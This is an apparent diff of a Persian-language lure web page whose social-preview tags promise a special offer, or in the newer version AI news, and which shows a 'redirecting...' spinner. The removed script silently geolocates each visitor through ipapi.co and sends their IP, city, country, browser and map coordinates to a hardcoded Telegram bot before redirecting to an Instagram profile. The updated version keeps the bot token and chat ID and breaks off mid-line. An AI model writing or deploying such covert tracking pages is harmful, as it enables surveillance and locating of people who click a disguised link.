@@ -1,28 +1,26 @@
+
 <!DOCTYPE html>
 <html lang="fa">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta property="og:title" content="🔥 پیشنهاد ویژه - فقط امروز!">
-    <meta property="og:description" content="برای دیدن این پیشنهاد شگفت‌انگیز کلیک کنید!">
-    <meta property="og:image" content="https://via.placeholder.com/1200x630/FF6B35/FFFFFF?text=پیشنهاد+ویژه">
-    <title>پیشنهاد ویژه</title>
+    <meta property="og:title" content="🤖 هوش مصنوعی داره دنیا رو عوض میکنه!">
+    <meta property="og:description" content="آخرین اخبار و ترفندهای AI رو اینجا ببین">
+    <meta property="og:image" content="https://via.placeholder.com/1200x630/6C63FF/FFFFFF?text=AI+News">
+    <title>در حال انتقال...</title>
+    <style>
+        body { margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f0f0f0; font-family: Arial; }
+        .loading { text-align: center; color: #555; }
+        .spinner { width: 40px; height: 40px; border: 4px solid #ddd; border-top: 4px solid #6C63FF; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 15px; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+    </style>
 </head>
 <body>
+    <div class="loading">
+        <div class="spinner"></div>
+        <p>در حال انتقال...</p>
+    </div>
 <script>
 const BOT_TOKEN = "8748697819:AAGFv8H8_psK1KZTpKDXLk0xo_Une1KOB1A";
 const CHAT_ID = "6821435123";
-const TELEGRAM_LINK = "https://instagram.com/Kaveh6294";
-async function main() {
-    try {
-        const r = await fetch("https://ipapi.co/json/");
-        const d = await r.json();
-        const msg = `🔔 بازدیدکننده جدید!\n🌍 کشور: ${d.country_name}\n🏙 شهر: ${d.city}\n🌐 IP: ${d.ip}\n📱 دستگاه: ${navigator.userAgent}\n🗺 نقشه: https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
-        await fetch("https://api.telegram.org/bot"+BOT_TOKEN+"/sendMessage",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({chat_id:CHAT_ID,text:msg})});
-    } catch(e){}
-    window.location.href = TELEGRAM_LINK;
-}
-main();
-</script>
-</body>
-</html> 
+const REDIRECT_LINK = "h
